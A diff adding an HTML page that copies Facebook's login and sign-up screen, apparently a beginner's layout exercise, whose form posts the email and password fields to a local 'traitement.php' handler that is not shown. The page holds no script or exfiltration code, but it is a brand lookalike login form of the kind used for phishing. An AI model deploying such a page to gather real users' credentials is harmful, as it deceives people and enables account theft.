@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="facebook.css">
+    <title>Document</title>
+</head>
+
+<body>
+    <div id="bloc_page">
+        <form action="traitement.php" method="post">
+            <div id="tete">
+                <header>
+                    <div id="en_tete">
+                        <h2>facebook</h2>
+                        <nav>
+                            <p id="adresse">
+                                <label class="lab1" for="Email">
+                                    Email or Phone
+                                </label><br />
+                                <input class="E" type="email" name="email" id="Email">
+                            </p>
+                            <p id="pass">
+                                <label class="lab1" for="Password"><br />
+                                    Password
+                                </label><br />
+                                <input class="E" type="password" name="pass" id="Password"><br />
+                                <label class="lab1" id="rappel" for="Password">
+                                    Forgot account?
+                                </label><br />
+                            </p>
+                            <p>
+                                <input id="soumet" type="submit" value="Log In">
+                            </p>
+                        </nav>
+                    </div>
+                </header>
+
+                <section>
+                    <aside>
+                        <h2>
+                            Connect with friends and the world around you on Facebook.
+                        </h2>
+                        <div id="ico1">
+                            <img id="j" src="jounal.png" alt="journal">
+                            <h3>See photos and updates <em>from friends in News Feed.</em></h3>
+                        </div>
+                        <div id="ico2"> 
+                            <img id="e" src="etoile.png" alt="etoile">
+                           <h3>Share what's new <em>in your life on your Timeline.</em></h3>
+                        </div>
+                        <div id="ico3">
+                            <img id="t" src="triangle.png" alt="">
+                            <h3>Find more <em>of what you're looking for with Facebook Search.</em></h3>
+                        </div>
+                    </aside>
+                    <article>
+                        <h1>Sign Up</h1>
+                        <h6>it's free and always will be.</h6>
+                        <p id="info">
+                            <input class="doublet" type="text" name="name" placeholder="First name">
+                            <input class="doublet" type="text" name="last name" placeholder="Last name"><br />
+                            <input class="double" type="email" name="email" placeholder="Mobile number or email"><br />
+                            <input class="double" type="password" name="pass" placeholder="New password"><br />
+                            
+                        </p>
+                        <p id="date">
+                            <p>Birthday</p>
+                            <select name="mois" id="naissance">
+                                <option value="jan">Jan</option>
+                                <option value="fev">Feb</option>
+                                <option value="mar">Mar</option>
+                                <option value="avr">Apr</option>
+                                <option value="mai">May</option>
+                                <option value="jun">Jun</option>
+                                <option value="jul">Jul</option>
+                                <option value="aou">Aou</option>
+                                <option value="sep">Sep</option>
+                                <option value="oct">Oct</option>
+                                <option value="nov">Nov</option>
+                                <option value="dec">Dec</option>
+                            </select>
+                            <select name="jour" id="naissance">
+                                <option value="">1</option>
+                                <option value="">2</option>
+                                <option value="">3</option>
+                                <option value="">4</option>
+                                <option value="">5</option>
+                                <option value="">6</option>
+                                <option value="">7</option>
+                                <option value="">8</option>
+                                <option value="">9</option>
+                                <option value="">10</option>
+                                <option value="">11</option>
+                                <option value="">12</option>
+                                <option value="">13</option>
+                                <option value="">14</option>
+                                <option value="">15</option>
+                                <option value="">16</option>
+                                <option value="">17</option>
+                                <option value="">18</option>
+                                <option value="">19</option>
+                                <option value="">20</option>
+                                <option value="">21</option>
+                                <option value="">22</option>
+                                <option value="">23</option>
+                                <option value="">24</option>
+                                <option value="">25</option>
+                                <option value="">26</option>
+                                <option value="">27</option>
+                                <option value="">28</option>
+                                <option value="">29</option>
+                                <option value="">30</option>
+                                <option value="">31</option>
+                            </select>
+                            <select name="annee" id="naissance">
+                                <option value="">1990</option>
+                                <option value="">1991</option>
+                                <option value="">1992</option>
+                                <option value="">1993</option>
+                                <option value="">1994</option>
+                                <option value="">1995</option>
+                                <option value="">1996</option>
+                                <option value="">1997</option>
+                                <option value="">1998</option>
+                                <option value="">1999</option>
+                                <option value="">2000</option>
+                                <option value="">2001</option>
+                                <option value="">2002</option>
+                                <option value="">2003</option>
+                                <option value="">2004</option>
+                                <option value="">2005</option>
+                                <option value="">2006</option>
+                                <option value="">2007</option>
+                                <option value="">2008</option>
+                                <option value="">2009</option>
+                                <option value="">2010</option>
+                            </select>
+                            <img class="inter" src="inter.png" alt="inter">
+                        </p>
+                        <p id="genre">  
+                            <p>Gender</p>
+                            <input class="rond" type="radio" name="sexe" id="female">
+                            <label class="lab" for="female">Female</label>
+                            <input class="rond" type="radio" name="sexe" id="male">
+                            <label class="lab" for="male">Male</label>
+                            <input class="rond" type="radio" name="sexe" id="custom">
+                            <label class="lab" for="custom">Custom</label>
+                            <img class="inter" src="inter.png" alt="inter">
+                            <br />
+                        </p>
+                        <p id="condition">
+                            By clicking Sign Up, you agree to our <em>Term, Data Policy </em>and <em>cookies Policy.</em>
+                            You may receive SMS Notifications from us can opt out any time.<br />
+                        
+                            <input id="envoyer" type="submit" value="Sign Up">
+                        </p>
+                            <footer>
+                                <strong>Create a Page </strong>for a celebrity, band or business.
+                            </footer>
+                    </article>
+                </section>
+            </div>
+        </form>
+    </div>
+</body>
+</html>
